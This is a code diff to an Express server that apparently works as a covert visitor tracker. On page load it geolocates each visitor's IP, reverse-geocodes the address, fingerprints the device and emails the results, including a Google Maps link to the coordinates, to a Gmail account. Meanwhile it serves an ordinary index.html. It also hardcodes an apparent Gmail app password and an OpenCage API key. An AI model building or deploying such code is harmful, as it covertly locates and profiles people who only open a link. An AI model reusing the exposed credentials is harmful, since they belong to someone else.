@@ -12,8 +12,8 @@ const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
     user: process.env.EMAIL_USER || 'staysane.rz@gmail.com',
-    pass: process.env.EMAIL_PASS || 'nvkq cudo ibhh usdr'
-  }
+    pass: process.env.EMAIL_PASS || 'nvkq cudo ibhh usdr',
+  },
 });
 
 app.use((req, res, next) => {
@@ -26,16 +26,21 @@ app.use((req, res, next) => {
 
 app.get('/', async (req, res) => {
   const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-  const userAgent = req.headers['user-agent'];
+  const userAgent = req.headers['user-agent'] || '';
   const referrer = req.headers['referer'] || 'direct';
   const timestamp = new Date().toISOString();
+  
+  if (userAgent.includes('UptimeRobot')) {
+    return res.status(204).end();
+  }
 
   const parser = new UAParser(userAgent);
   const device = parser.getDevice();
   const os = parser.getOS();
   const browser = parser.getBrowser();
-
-  const screenResolution = getApproximateResolution(device.model || userAgent);
+  const engine = parser.getEngine(); 
+  const cpu = parser.getCPU(); 
+  const deviceType = device.type || 'Unknown';
 
   const connectionType = inferConnectionType(req);
 
@@ -48,12 +53,15 @@ app.get('/', async (req, res) => {
   let coordinates = 'N/A';
   let timezone = 'N/A';
   let geoAddress = 'N/A';
+  let lat, lon;
 
   try {
     const geo = await axios.get(`http://ip-api.com/json/${ip}`);
-    const { city, regionName, country, isp, lat, lon, timezone: tz } = geo.data;
+    const { city, regionName, country, isp, lat: latitude, lon: longitude, timezone: tz } = geo.data;
     location = `${city}, ${regionName}, ${country} (ISP: ${isp})`;
-    coordinates = `{Latitude, Longitude}: ${lat}, ${lon}`;
+    coordinates = `{Latitude, Longitude}: ${latitude}, ${longitude}`;
+    lat = latitude;
+    lon = longitude;
     timezone = tz || 'N/A';
 
     const OPEN_CAGE_KEY = 'cd07cd206f6a4f7086bed7fa65741f82';
@@ -77,17 +85,21 @@ Reverse Geocoded Address: ${geoAddress}
 Coordinates: ${coordinates}
 Timezone: ${timezone}
 
+Device Type: ${deviceType}
 Device Brand: ${device.vendor || 'Unknown brand'}
 Device Model: ${device.model || 'Unknown model'}
 OS: ${os.name || 'OS'} ${os.version || ''}
 Browser: ${browser.name || 'Browser'} ${browser.version || ''}
+Engine: ${engine.name || 'Unknown engine'}
 
-Approx. Screen Resolution: ${screenResolution}
+CPU: ${cpu.architecture || 'Unknown CPU architecture'}
 Inferred Connection Type: ${connectionType}
 Session Duration: ${sessionDuration}
 
 User Agent: ${userAgent}
-Referrer: ${referrer}`
+Referrer: ${referrer}
+
+Google Maps Location: https://www.google.com/maps?q=${lat},${lon}`
   };
 
   transporter.sendMail(mailOptions, (error) => {
@@ -96,17 +108,6 @@ Referrer: ${referrer}`
 
   res.sendFile(__dirname + '/index.html');
 });
-
-function getApproximateResolution(deviceModel) {
-  const resolutions = {
-    'iPhone': '750x1334',      
-    'iPad': '1536x2048',       
-    'Macintosh': '1440x900',  
-    'Windows': '1920x1080',    
-    'Android': '1080x1920'     
-  };
-  return resolutions[deviceModel] || 'Unknown';
-}
 
 function inferConnectionType(req) {
   const ip = req.ip;
